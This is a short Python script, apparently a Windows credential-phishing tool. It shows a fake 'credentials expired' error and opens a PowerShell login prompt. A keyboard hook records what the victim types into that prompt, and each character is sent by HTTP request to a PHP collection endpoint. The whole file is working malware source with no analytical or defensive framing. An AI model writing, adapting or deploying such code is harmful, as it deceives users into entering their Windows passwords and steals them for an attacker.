#@author:
#@file:main.py
import pythoncom, pyHook
import pyHook
from ctypes import *
import requests
import win32api
import win32con
import os
import threading

win32api.MessageBox(0,"Windows凭证失效","Windows Error",win32con.MB_ICONERROR)
os.popen(r'''powershell iex "$creds = $host.ui.PromptForCredential(\"Login Required\",\"Enter username and password.\", \"$env:username\",\"NewBiosUserName\");"''')
print('[+] windows凭证捕获')
passwd=[]
def OnKeyboardEvent(event):
    windowTitle=create_string_buffer(512)
    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
    windowname=windowTitle.value.decode('gbk')
    if 'Login Required'==windowname:
        key=chr(event.Ascii)
        if key!='':
            print('{}'.format(key),end='')
            passwd.append(key)
        elif len(key)==0:
            print('\n')
# return True to pass the event to other handlers
    return True

def run():
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all mouse events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    print('键盘输入:')
    pythoncom.PumpMessages()

if __name__ == '__main__':
    t=threading.Thread(target=run,args=())
    t.setDaemon(True)
    t.start()
    t.join(10)
    for j in passwd:
        if str(j)=='\x00' or str(j)=='\t':
            pass
        else:
            rqt=requests.get(url='http://127.0.0.1/jieshou.php?password={}'.format(str(j)),headers={'user-agent':'nb'})